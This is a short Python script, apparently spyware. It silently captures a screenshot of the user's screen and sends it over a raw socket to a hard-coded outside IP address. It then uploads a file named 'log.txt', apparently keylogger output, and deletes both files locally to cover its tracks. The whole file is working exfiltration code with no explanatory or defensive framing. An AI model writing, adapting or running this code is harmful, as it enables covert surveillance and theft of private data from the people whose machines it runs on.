import os
import random
import socket
import string

from anyio import sleep


def screenshot():
    global pics_names
    import pyautogui
    def generate_name():
        return ''.join(random.choice(string.ascii_uppercase
                       + string.digits) for _ in range(7))
    name = str(generate_name())
    pyautogui.screenshot().save(name + '.png')
    send_file(name+'.png')
    return name+'.png'


def send_file(file_path):
    HOST = '113.203.205.89'  # Server IP address
    PORT = 12345  # Server port number
    file_path = file_path
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print('Connected to', HOST)

        file_name = file_path.split('/')[-1]
        s.sendall(file_name.encode())

        with open(file_path, 'rb') as file:
            print('Sending', file_name)
            while True:
                data = file.read(1024)
                if not data:
                    break
                s.sendall(data)

        print('File sent successfully')

if __name__ == '__main__':
    file_path = 'log.txt'
    name = screenshot()
    print(name)
    os.remove(name)
    sleep(2)
    send_file(file_path)
    os.remove(file_path)